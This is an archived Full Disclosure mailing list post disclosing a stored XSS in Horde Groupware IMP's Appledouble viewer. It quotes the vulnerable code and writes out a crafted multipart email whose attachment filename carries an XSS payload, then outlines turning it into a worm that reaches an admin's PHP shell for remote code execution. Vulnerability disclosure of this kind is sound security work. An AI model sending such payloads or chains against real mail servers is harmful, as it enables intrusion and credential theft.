---
title: FD - Half-click unauthenticated remote code execution on Horde Groupware IMP (from a stored XSS)
url: https://seclists.org/fulldisclosure/2026/Aug/115
source: Full Disclosure
date: 2026-08-26
fetch_date: 2026-08-27T12:14:22.991184
---

# FD - Half-click unauthenticated remote code execution on Horde Groupware IMP (from a stored XSS)

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](114)
[By Date](date.html#115)
![Next](/images/right-icon-16x16.png)

[![Previous](/images/left-icon-16x16.png)](114)
[By Thread](index.html#115)
![Next](/images/right-icon-16x16.png)

![](/shared/images/nst-icons.svg#search)

# FD - Half-click unauthenticated remote code execution on Horde Groupware IMP (from a stored XSS)

---

*From*: Evan Tang <evan@zenith.hosting>
*Date*: Tue, 25 Aug 2026 00:24:09 +0800

---

```
https://blog.evan.lat/posts/CVE-2026-65053/

the blog talks about two vulns that are chainable together. for the sake of
brevity ill write up on the stored xss one.

in lib/Mime/Status.php, we see a pretty viable xss sink:

$out .= '<tr><td>' . $val . '</td></tr>';

xrefing this we see that most impls are sanitized with the exception of
lib/Mime/Viewer/Appledouble.php:

$data_name = $this->getConfigParam('imp_contents')->getPartName($data_part);
// ...
sprintf(_("This message contains a Macintosh file (named \"%s\")."),
$data_name)

exploiting this is trivial obviously. we just need to craft an email like
this:

From: d () x com
To: victim () target com
Subject: mac file
MIME-Version: 1.0
Content-Type: multipart/appledouble; boundary="BOUND"

--BOUND
Content-Type: application/applefile
Content-Transfer-Encoding: base64

cmVzb3VyY2UtZm9yay1ieXRlcw==

--BOUND
Content-Type: application/octet-stream; name="<img src=x
onerror=alert('hi')>"
Content-Disposition: attachment; filename="<img src=x onerror=alert('hu2')>"
Content-Transfer-Encoding: base64

ZGF0YS1mb3JrLWJ5dGVz

--BOUND--
given the nature of this xss it is very much wormable and turns our
existing arb file read to a half click exploit. obviously we wouldnt really
want to use a half click primitive just to read files (although grabbing db
creds is very trivial with these two vulns chained), so naturally we can
try to achieve rce with this xss worm primitive.

to get an rce from this is easy. we can either target an admin or craft an
xss worm thatll eventually reach an admin. admins can access a PHP shell
which let us run arbitrary php code, so we can simply use the xss to hit
the PHP shell at /horde/admin/phpshell.php

this constitutes a half click since the user simply needs to click on the
email to trigger the xss in question. an exp poc is provided in the blog.
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](114)
[By Date](date.html#115)
![Next](/images/right-icon-16x16.png)

[![Previous](/images/left-icon-16x16.png)](114)
[By Thread](index.html#115)
![Next](/images/right-icon-16x16.png)

### Current thread:

* **FD - Half-click unauthenticated remote code execution on Horde Groupware IMP (from a stored XSS)** *Evan Tang (Aug 26)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")